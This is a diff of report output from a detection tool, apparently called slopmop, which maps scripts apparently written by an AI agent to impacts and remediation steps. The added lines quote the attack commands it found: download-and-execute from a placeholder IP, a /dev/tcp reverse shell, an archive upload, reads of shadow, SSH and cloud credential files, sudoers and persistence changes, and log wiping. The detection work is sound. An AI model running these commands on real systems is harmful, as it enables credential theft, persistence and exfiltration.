@@ -5,95 +5,174 @@ slopmop report   <folder>
 Impact
   [x] Privileged access obtained
       A principal was given a privileged role or permission, or a route to root on a host was opened. Treat what it governs as under attacker control until reviewed.
-      basis  SudoersModification, SetuidBit, ContainerEscape
-      files  20261022_091000_step03_privesc.sh
+      targets  file /etc/sudoers.d/svc; file /tmp/tool ($F); mount /:/host
+      what     SudoersModification: echo "$RULE" >> /etc/sudoers.d/svc (20261022_091000_step03_privesc.sh:5)
+               SetuidBit: chmod u+s "$F" (20261022_091000_step03_privesc.sh:4)
+               ContainerEscape: docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)
+      basis    SudoersModification, SetuidBit, ContainerEscape
   [x] Credentials exposed
       Secrets, keys, certificates or stored passwords were read. Treat them as known to the attacker.
-      basis  ShadowFileRead, PrivateKeyRead, CredentialFileRead, ShellHistoryRead, CloudMetadataAccess, ClusterSecretRead
-      files  20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh
+      targets  file /etc/shadow; file ~/.ssh/id_rsa; file ~/.aws/credentials; file ~/.bash_history; url http://169.254.169.254/latest/meta-data/; hash of deploy; password of app_rw; token fi********9 (24 chars)
+      what     ShadowFileRead: sudo cat /etc/shadow > shadow_20261022_090530.txt (20261022_090500_step02_creds.sh:6)
+               PrivateKeyRead: cat ~/.ssh/id_rsa (20261022_090500_step02_creds.sh:4)
+               CredentialFileRead: cat ~/.aws/credentials (20261022_090500_step02_creds.sh:3)
+               ShellHistoryRead: grep -i token ~/.bash_history (20261022_090500_step02_creds.sh:5)
+               CloudMetadataAccess: curl -s http://169.254.169.254/latest/meta-data/ > meta_20261022_090040.txt (20261022_090000_step01_recon.sh:9)
+               ClusterSecretRead: kubectl get secrets -A -o yaml (20261022_090500_step02_creds.sh:7)
+      basis    ShadowFileRead, PrivateKeyRead, CredentialFileRead, ShellHistoryRead, CloudMetadataAccess, ClusterSecretRead, exposed password
   [x] Persistence established
       A way back in was created: a credential, an account, a key, a scheduled job, a service or a start-up entry. Access survives a password reset.
-      basis  ScheduledJobCreation, SystemdUnitCreation, AccountCreation, SshKeyPersistence, ShellProfilePersistence, Persistence tools
-      files  20261022_091500_step04_persist.sh, audit_20261022_093500.jsonl
+      targets  unit sync.service; account svc; file ~/.ssh/authorized_keys; file ~/.bashrc
+      what     ScheduledJobCreation: (crontab -l; echo "$JOB") | crontab - (20261022_091500_step04_persist.sh:3)
+               ScheduledJobCreation: crontab - (audit_20261022_093500.jsonl)
+               SystemdUnitCreation: cp sync.service /etc/systemd/system/sync.service (20261022_091500_step04_persist.sh:5)
+               SystemdUnitCreation: systemctl enable --now sync.service (20261022_091500_step04_persist.sh:6)
+               AccountCreation: useradd -m -s /bin/bash svc (20261022_091500_step04_persist.sh:7)
+               AccountCreation: useradd -m -s /bin/bash svc (audit_20261022_093500.jsonl)
+               and 3 more in the saved report
+      basis    ScheduledJobCreation, SystemdUnitCreation, AccountCreation, SshKeyPersistence, ShellProfilePersistence, Persistence tools
   [x] Data collected
       Mail, chat, documents or files were gathered in bulk. Treat their content as disclosed.
-      basis  ArchiveCreation, Collection tools
-      files  20261022_092500_step06_stage.sh
+      targets  archive out.tgz
+      what     ArchiveCreation: tar czf out.tgz dir/ (20261022_092500_step06_stage.sh:3)
+               gzip: gzip {} (20261022_092500_step06_stage.sh:7)
+      basis    ArchiveCreation, Collection tools
   [x] Data may have left the environment
       A transfer out was run. Confirm what was sent and where.
-      basis  FileUpload, Exfiltration tools
-      files  20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py
+      targets  url https://files.example.net/up; file out.tgz
+      what     FileUpload: curl -T out.tgz https://files.example.net/up (20261022_092500_step06_stage.sh:8)
+               nc: nc -zv 203.0.113.41 443 (20261022_093000_step07_channel.py:7)
+      basis    FileUpload, Exfiltration tools
   [x] Outside hosts contacted
       Files or commands were fetched from, or a channel was opened to, hosts outside the environment. Affected: 198.51.100.7, 203.0.113.40, 203.0.113.41.
-      basis  ShellDownloadAndExecute, ReverseShell
-      files  20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py
+      targets  url http://203.0.113.40/s.sh; host 203.0.113.41 ($H)
+      what     ShellDownloadAndExecute: sudo bash -c "$(curl -fsSL http://203.0.113.40/s.sh)" (20261022_092500_step06_stage.sh:4)
+               ReverseShell: os.system("exec 3<>/dev/tcp/$H/$PORT") (20261022_093000_step07_channel.py:8)
+      basis    ShellDownloadAndExecute, ReverseShell
   [x] Movement to other systems
       Tools that reach other systems were run. Hosts beyond this one may be affected.
-      basis  LateralMovement tools
-      files  20261022_092500_step06_stage.sh
+      what     ssh: ssh ops@198.51.100.7 'cat /etc/hostname' (20261022_092500_step06_stage.sh:6)
+      basis    LateralMovement tools
   [x] Defences and logging impaired
       Logs were cleared or security tooling was interfered with. Records of this period are incomplete.
-      basis  LogDeletion, HistoryDisabling, SecurityToolDisabling, FirewallDisabling, DefenseImpairment tools
-      files  20261022_092000_step05_evade.sh, audit_20261022_093500.jsonl
+      targets  log /var/log/auth.log; setting HISTFILE; service auditd
+      what     LogDeletion: rm -f /var/log/auth.log (20261022_092000_step05_evade.sh:6)
+               HistoryDisabling: unset HISTFILE (20261022_092000_step05_evade.sh:3)
+               SecurityToolDisabling: systemctl stop auditd (20261022_092000_step05_evade.sh:4)
+               SecurityToolDisabling: systemctl stop auditd (audit_20261022_093500.jsonl)
+               FirewallDisabling: iptables -F (20261022_092000_step05_evade.sh:5)
+               FirewallDisabling: iptables -F (audit_20261022_093500.jsonl)
+               and 1 more in the saved report
+      basis    LogDeletion, HistoryDisabling, SecurityToolDisabling, FirewallDisabling, DefenseImpairment tools
   [!] Code run outside normal controls
       Code was run in ways that avoid application control and leave little on disk.
-      basis  ShellDownloadAndExecute
-      files  20261022_092500_step06_stage.sh
+      targets  url http://203.0.113.40/s.sh
+      what     ShellDownloadAndExecute: sudo bash -c "$(curl -fsSL http://203.0.113.40/s.sh)" (20261022_092500_step06_stage.sh:4)
+      basis    ShellDownloadAndExecute
   [!] Traces hidden
       Files or history were removed or disguised. What is left on the host is incomplete.
-      basis  HistoryClearing, Timestomp
-      files  20261022_092000_step05_evade.sh
+      what     HistoryClearing: history -c (20261022_092000_step05_evade.sh:7)
+               Timestomp: touch -r /bin/ls "$F" (20261022_092000_step05_evade.sh:8)
+      basis    HistoryClearing, Timestomp
   [!] Commands generated by an AI agent
       The scripts were written by an AI agent, which is the premise of this tool. Generated commands differ from run to run, so a detection that matches exact text misses them.
-      basis  the premise of the tool
-      files  20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh and 5 more
+      basis    the premise of the tool
+      files    20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh and 5 more
   [i] Environment mapped
       Identities, resources or configuration were listed. Later steps were probably aimed with the result.
-      basis  SetuidFileSearch, ServiceDiscovery, Discovery tools
-      files  20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh and 1 more
+      targets  searched /; service sshd; username alerts@corp.example; username app_rw; username daemon; username deploy; username root; username svc; email alerts@corp.example; device build01.corp.internal; device db01.corp.internal; ip 10.20.30.5; and 1 more
+      what     SetuidFileSearch: find / -perm -4000 -type f 2>/dev/null > suid_20261022_090030.txt (20261022_090000_step01_recon.sh:8)
+               ServiceDiscovery: systemctl status sshd (20261022_090000_step01_recon.sh:7)
+               id: id (20261022_090000_step01_recon.sh:3)
+               uname: uname -a (20261022_090000_step01_recon.sh:3)
+               kubectl: kubectl get secrets -A -o yaml (20261022_090500_step02_creds.sh:7)
+               docker: docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)
+               and 3 more in the saved report
+      basis    SetuidFileSearch, ServiceDiscovery, Discovery tools, exposed username, exposed email, exposed device, exposed ip
 
 Remediation   (most urgent first)
   [x] Revoke sessions and reset identities
       Revoke the sessions and tokens of every identity in the evidence and reset its credentials.
-      basis  LateralMovement tools
-      files  20261022_092500_step06_stage.sh
+      what     ssh: ssh ops@198.51.100.7 'cat /etc/hostname' (20261022_092500_step06_stage.sh:6)
+      basis    LateralMovement tools
   [x] Rotate what was read
       Rotate every secret, key and certificate that was read, and reset the accounts of any host whose credentials were dumped.
-      basis  ShadowFileRead, PrivateKeyRead, CredentialFileRead, ShellHistoryRead, CloudMetadataAccess, ClusterSecretRead
-      files  20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh
+      targets  file /etc/shadow; file ~/.ssh/id_rsa; file ~/.aws/credentials; file ~/.bash_history; url http://169.254.169.254/latest/meta-data/; hash of deploy; password of app_rw; token fi********9 (24 chars)
+      what     ShadowFileRead: sudo cat /etc/shadow > shadow_20261022_090530.txt (20261022_090500_step02_creds.sh:6)
+               PrivateKeyRead: cat ~/.ssh/id_rsa (20261022_090500_step02_creds.sh:4)
+               CredentialFileRead: cat ~/.aws/credentials (20261022_090500_step02_creds.sh:3)
+               ShellHistoryRead: grep -i token ~/.bash_history (20261022_090500_step02_creds.sh:5)
+               CloudMetadataAccess: curl -s http://169.254.169.254/latest/meta-data/ > meta_20261022_090040.txt (20261022_090000_step01_recon.sh:9)
+               ClusterSecretRead: kubectl get secrets -A -o yaml (20261022_090500_step02_creds.sh:7)
+      basis    ShadowFileRead, PrivateKeyRead, CredentialFileRead, ShellHistoryRead, CloudMetadataAccess, ClusterSecretRead, exposed password
   [x] Remove persistence
       Delete the scheduled jobs, services, accounts, keys and start-up entries that were created, and the files they start.
-      basis  ScheduledJobCreation, SystemdUnitCreation, AccountCreation, SshKeyPersistence, ShellProfilePersistence, Persistence tools
-      files  20261022_091500_step04_persist.sh, audit_20261022_093500.jsonl
+      targets  unit sync.service; account svc; file ~/.ssh/authorized_keys; file ~/.bashrc
+      what     ScheduledJobCreation: (crontab -l; echo "$JOB") | crontab - (20261022_091500_step04_persist.sh:3)
+               ScheduledJobCreation: crontab - (audit_20261022_093500.jsonl)
+               SystemdUnitCreation: cp sync.service /etc/systemd/system/sync.service (20261022_091500_step04_persist.sh:5)
+               SystemdUnitCreation: systemctl enable --now sync.service (20261022_091500_step04_persist.sh:6)
+               AccountCreation: useradd -m -s /bin/bash svc (20261022_091500_step04_persist.sh:7)
+               AccountCreation: useradd -m -s /bin/bash svc (audit_20261022_093500.jsonl)
+               and 3 more in the saved report
+      basis    ScheduledJobCreation, SystemdUnitCreation, AccountCreation, SshKeyPersistence, ShellProfilePersistence, Persistence tools
   [x] Undo privilege changes on hosts
       Put sudo rules, file modes and container settings back to their approved state, and treat the host as held at root until rebuilt.
-      basis  SudoersModification, SetuidBit, ContainerEscape
-      files  20261022_091000_step03_privesc.sh
+      targets  file /etc/sudoers.d/svc; file /tmp/tool ($F); mount /:/host
+      what     SudoersModification: echo "$RULE" >> /etc/sudoers.d/svc (20261022_091000_step03_privesc.sh:5)
+               SetuidBit: chmod u+s "$F" (20261022_091000_step03_privesc.sh:4)
+               ContainerEscape: docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)
+      basis    SudoersModification, SetuidBit, ContainerEscape
   [x] Restore security tooling
       Turn the stopped security services, audit rules and firewall back on, and confirm that each reports again.
-      basis  SecurityToolDisabling, FirewallDisabling
-      files  20261022_092000_step05_evade.sh, audit_20261022_093500.jsonl
+      targets  service auditd
+      what     SecurityToolDisabling: systemctl stop auditd (20261022_092000_step05_evade.sh:4)
+               SecurityToolDisabling: systemctl stop auditd (audit_20261022_093500.jsonl)
+               FirewallDisabling: iptables -F (20261022_092000_step05_evade.sh:5)
+               FirewallDisabling: iptables -F (audit_20261022_093500.jsonl)
+      basis    SecurityToolDisabling, FirewallDisabling
   [x] Block and hunt the infrastructure
       Block the addresses and domains in the findings, and search proxy, DNS and firewall logs for other hosts that reached them.
-      basis  ShellDownloadAndExecute, FileUpload, ReverseShell
-      files  20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py
+      targets  url http://203.0.113.40/s.sh; url https://files.example.net/up; file out.tgz; host 203.0.113.41 ($H)
+      what     ShellDownloadAndExecute: sudo bash -c "$(curl -fsSL http://203.0.113.40/s.sh)" (20261022_092500_step06_stage.sh:4)
+               FileUpload: curl -T out.tgz https://files.example.net/up (20261022_092500_step06_stage.sh:8)
+               ReverseShell: os.system("exec 3<>/dev/tcp/$H/$PORT") (20261022_093000_step07_channel.py:8)
+      basis    ShellDownloadAndExecute, FileUpload, ReverseShell
   [x] Scope the data taken
       Establish from audit logs which mailboxes, chats, sites and files were read or sent out, and assess that data as breached.
-      basis  FileUpload, ArchiveCreation, Collection tools, Exfiltration tools
-      files  20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py
+      targets  url https://files.example.net/up; file out.tgz; archive out.tgz
+      what     FileUpload: curl -T out.tgz https://files.example.net/up (20261022_092500_step06_stage.sh:8)
+               ArchiveCreation: tar czf out.tgz dir/ (20261022_092500_step06_stage.sh:3)
+               gzip: gzip {} (20261022_092500_step06_stage.sh:7)
+               nc: nc -zv 203.0.113.41 443 (20261022_093000_step07_channel.py:7)
+      basis    FileUpload, ArchiveCreation, Collection tools, Exfiltration tools
   [!] Find the delivered files
       Collect the files that were downloaded, dropped or loaded, hash them, and search every host for the same hashes.
-      basis  ShellDownloadAndExecute
-      files  20261022_092500_step06_stage.sh
+      targets  url http://203.0.113.40/s.sh
+      what     ShellDownloadAndExecute: sudo bash -c "$(curl -fsSL http://203.0.113.40/s.sh)" (20261022_092500_step06_stage.sh:4)
+      basis    ShellDownloadAndExecute
   [!] Recover the missing logs
       Treat local logs as incomplete, and recover the period from a central collector or a backup.
-      basis  LogDeletion, HistoryClearing, HistoryDisabling, Timestomp, DefenseImpairment tools
-      files  20261022_092000_step05_evade.sh, audit_20261022_093500.jsonl
+      targets  log /var/log/auth.log; setting HISTFILE
+      what     LogDeletion: rm -f /var/log/auth.log (20261022_092000_step05_evade.sh:6)
+               HistoryClearing: history -c (20261022_092000_step05_evade.sh:7)
+               HistoryDisabling: unset HISTFILE (20261022_092000_step05_evade.sh:3)
+               Timestomp: touch -r /bin/ls "$F" (20261022_092000_step05_evade.sh:8)
+               iptables: iptables -F (20261022_092000_step05_evade.sh:5)
+               iptables: iptables -F (audit_20261022_093500.jsonl)
+      basis    LogDeletion, HistoryClearing, HistoryDisabling, Timestomp, DefenseImpairment tools
   [i] Follow what was enumerated
       Use what was listed to predict targets: check those identities, vaults and hosts for later activity.
-      basis  SetuidFileSearch, ServiceDiscovery, Discovery tools
-      files  20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh and 1 more
+      targets  searched /; service sshd; username alerts@corp.example; username app_rw; username daemon; username deploy; username root; username svc; email alerts@corp.example; device build01.corp.internal; device db01.corp.internal; ip 10.20.30.5; and 1 more
+      what     SetuidFileSearch: find / -perm -4000 -type f 2>/dev/null > suid_20261022_090030.txt (20261022_090000_step01_recon.sh:8)
+               ServiceDiscovery: systemctl status sshd (20261022_090000_step01_recon.sh:7)
+               id: id (20261022_090000_step01_recon.sh:3)
+               uname: uname -a (20261022_090000_step01_recon.sh:3)
+               kubectl: kubectl get secrets -A -o yaml (20261022_090500_step02_creds.sh:7)
+               docker: docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)
+               and 3 more in the saved report
+      basis    SetuidFileSearch, ServiceDiscovery, Discovery tools, exposed username, exposed email, exposed device, exposed ip
 
 [x] HIGH - 12 impacts: 8 high, 3 medium, 1 low
--> saved to <out>: report.txt, files.json, trace.json, findings.json, report.json
+-> saved to <out>: report.txt, files.json, trace.json, findings.json, exposure.json, report.json
 -> one section: slopmop -inputdir <folder> report impact
